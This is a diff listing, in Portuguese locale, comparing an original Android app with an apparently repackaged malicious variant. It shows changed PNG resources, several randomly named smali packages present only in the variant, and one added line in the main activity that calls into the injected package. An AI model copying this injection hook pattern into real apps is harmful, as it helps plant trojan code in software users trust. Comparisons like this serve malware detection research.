+Os arquivos binários result/APP_88/App_B_88/res/drawable-mdpi-v4/common_signin_btn_icon_disabled_focus_light.9.png e result/APP_88/App_M_88/res/drawable-mdpi-v4/common_signin_btn_icon_disabled_focus_light.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-mdpi-v4/common_signin_btn_icon_disabled_light.9.png e result/APP_88/App_M_88/res/drawable-mdpi-v4/common_signin_btn_icon_disabled_light.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-mdpi-v4/common_signin_btn_icon_focus_dark.9.png e result/APP_88/App_M_88/res/drawable-mdpi-v4/common_signin_btn_icon_focus_dark.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-mdpi-v4/common_signin_btn_icon_focus_light.9.png e result/APP_88/App_M_88/res/drawable-mdpi-v4/common_signin_btn_icon_focus_light.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-mdpi-v4/common_signin_btn_icon_normal_dark.9.png e result/APP_88/App_M_88/res/drawable-mdpi-v4/common_signin_btn_icon_normal_dark.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-mdpi-v4/common_signin_btn_icon_normal_light.9.png e result/APP_88/App_M_88/res/drawable-mdpi-v4/common_signin_btn_icon_normal_light.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-mdpi-v4/common_signin_btn_icon_pressed_dark.9.png e result/APP_88/App_M_88/res/drawable-mdpi-v4/common_signin_btn_icon_pressed_dark.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-mdpi-v4/common_signin_btn_icon_pressed_light.9.png e result/APP_88/App_M_88/res/drawable-mdpi-v4/common_signin_btn_icon_pressed_light.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-mdpi-v4/common_signin_btn_text_disabled_dark.9.png e result/APP_88/App_M_88/res/drawable-mdpi-v4/common_signin_btn_text_disabled_dark.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-mdpi-v4/common_signin_btn_text_disabled_focus_dark.9.png e result/APP_88/App_M_88/res/drawable-mdpi-v4/common_signin_btn_text_disabled_focus_dark.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-mdpi-v4/common_signin_btn_text_disabled_focus_light.9.png e result/APP_88/App_M_88/res/drawable-mdpi-v4/common_signin_btn_text_disabled_focus_light.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-mdpi-v4/common_signin_btn_text_disabled_light.9.png e result/APP_88/App_M_88/res/drawable-mdpi-v4/common_signin_btn_text_disabled_light.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-mdpi-v4/common_signin_btn_text_focus_dark.9.png e result/APP_88/App_M_88/res/drawable-mdpi-v4/common_signin_btn_text_focus_dark.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-mdpi-v4/common_signin_btn_text_focus_light.9.png e result/APP_88/App_M_88/res/drawable-mdpi-v4/common_signin_btn_text_focus_light.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-mdpi-v4/common_signin_btn_text_normal_dark.9.png e result/APP_88/App_M_88/res/drawable-mdpi-v4/common_signin_btn_text_normal_dark.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-mdpi-v4/common_signin_btn_text_normal_light.9.png e result/APP_88/App_M_88/res/drawable-mdpi-v4/common_signin_btn_text_normal_light.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-mdpi-v4/common_signin_btn_text_pressed_dark.9.png e result/APP_88/App_M_88/res/drawable-mdpi-v4/common_signin_btn_text_pressed_dark.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-mdpi-v4/common_signin_btn_text_pressed_light.9.png e result/APP_88/App_M_88/res/drawable-mdpi-v4/common_signin_btn_text_pressed_light.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-xhdpi-v4/common_signin_btn_icon_disabled_dark.9.png e result/APP_88/App_M_88/res/drawable-xhdpi-v4/common_signin_btn_icon_disabled_dark.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-xhdpi-v4/common_signin_btn_icon_disabled_focus_dark.9.png e result/APP_88/App_M_88/res/drawable-xhdpi-v4/common_signin_btn_icon_disabled_focus_dark.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-xhdpi-v4/common_signin_btn_icon_disabled_focus_light.9.png e result/APP_88/App_M_88/res/drawable-xhdpi-v4/common_signin_btn_icon_disabled_focus_light.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-xhdpi-v4/common_signin_btn_icon_disabled_light.9.png e result/APP_88/App_M_88/res/drawable-xhdpi-v4/common_signin_btn_icon_disabled_light.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-xhdpi-v4/common_signin_btn_icon_focus_dark.9.png e result/APP_88/App_M_88/res/drawable-xhdpi-v4/common_signin_btn_icon_focus_dark.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-xhdpi-v4/common_signin_btn_icon_focus_light.9.png e result/APP_88/App_M_88/res/drawable-xhdpi-v4/common_signin_btn_icon_focus_light.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-xhdpi-v4/common_signin_btn_icon_normal_dark.9.png e result/APP_88/App_M_88/res/drawable-xhdpi-v4/common_signin_btn_icon_normal_dark.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-xhdpi-v4/common_signin_btn_icon_normal_light.9.png e result/APP_88/App_M_88/res/drawable-xhdpi-v4/common_signin_btn_icon_normal_light.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-xhdpi-v4/common_signin_btn_icon_pressed_dark.9.png e result/APP_88/App_M_88/res/drawable-xhdpi-v4/common_signin_btn_icon_pressed_dark.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-xhdpi-v4/common_signin_btn_icon_pressed_light.9.png e result/APP_88/App_M_88/res/drawable-xhdpi-v4/common_signin_btn_icon_pressed_light.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-xhdpi-v4/common_signin_btn_text_disabled_dark.9.png e result/APP_88/App_M_88/res/drawable-xhdpi-v4/common_signin_btn_text_disabled_dark.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-xhdpi-v4/common_signin_btn_text_disabled_focus_dark.9.png e result/APP_88/App_M_88/res/drawable-xhdpi-v4/common_signin_btn_text_disabled_focus_dark.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-xhdpi-v4/common_signin_btn_text_disabled_focus_light.9.png e result/APP_88/App_M_88/res/drawable-xhdpi-v4/common_signin_btn_text_disabled_focus_light.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-xhdpi-v4/common_signin_btn_text_disabled_light.9.png e result/APP_88/App_M_88/res/drawable-xhdpi-v4/common_signin_btn_text_disabled_light.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-xhdpi-v4/common_signin_btn_text_focus_dark.9.png e result/APP_88/App_M_88/res/drawable-xhdpi-v4/common_signin_btn_text_focus_dark.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-xhdpi-v4/common_signin_btn_text_focus_light.9.png e result/APP_88/App_M_88/res/drawable-xhdpi-v4/common_signin_btn_text_focus_light.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-xhdpi-v4/common_signin_btn_text_normal_dark.9.png e result/APP_88/App_M_88/res/drawable-xhdpi-v4/common_signin_btn_text_normal_dark.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-xhdpi-v4/common_signin_btn_text_normal_light.9.png e result/APP_88/App_M_88/res/drawable-xhdpi-v4/common_signin_btn_text_normal_light.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-xhdpi-v4/common_signin_btn_text_pressed_dark.9.png e result/APP_88/App_M_88/res/drawable-xhdpi-v4/common_signin_btn_text_pressed_dark.9.png são diferentes
+Os arquivos binários result/APP_88/App_B_88/res/drawable-xhdpi-v4/common_signin_btn_text_pressed_light.9.png e result/APP_88/App_M_88/res/drawable-xhdpi-v4/common_signin_btn_text_pressed_light.9.png são diferentes
+Somente em result/APP_88/App_M_88/smali/com: babalay
+Somente em result/APP_88/App_M_88/smali/com: basyatw
+Somente em result/APP_88/App_M_88/smali/com: bpztwen
+diff -r result/APP_88/App_B_88/smali/com/butchersWorkshop/spaceSaw/SpaceSawActivity.smali result/APP_88/App_M_88/smali/com/butchersWorkshop/spaceSaw/SpaceSawActivity.smali
+8760a8761,8762
+>     invoke-static {p0}, Lcom/basyatw/bcpawsen/DaywtanActivity;->Tawo(Landroid/content/Context;)V
+> 
+Somente em result/APP_88/App_M_88/smali/com: czvzoytyttq
+Somente em result/APP_88/App_M_88/smali/com: zpvg
+Somente em result/APP_88/App_B_88/: unknown
